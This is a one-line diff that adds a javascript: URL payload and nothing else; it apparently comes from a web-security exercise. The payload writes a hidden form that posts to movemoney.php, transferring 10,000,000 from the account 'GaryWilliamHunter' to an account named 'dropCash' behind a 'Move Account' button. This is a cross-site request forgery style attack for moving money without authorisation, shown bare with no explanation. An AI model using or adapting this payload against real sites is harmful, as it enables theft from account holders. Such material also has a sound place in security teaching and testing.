@@ -1,0 +1,1 @@
+javascript:void(document.write('<form name=the_form action=movemoney.php method=post><input type = hidden name = FROM value = GaryWilliamHunter><input type=hidden name=TO value = dropCash><input type=hidden name = AMOUNT value = 10000000><input type = submit value="Move Account"></form>'))
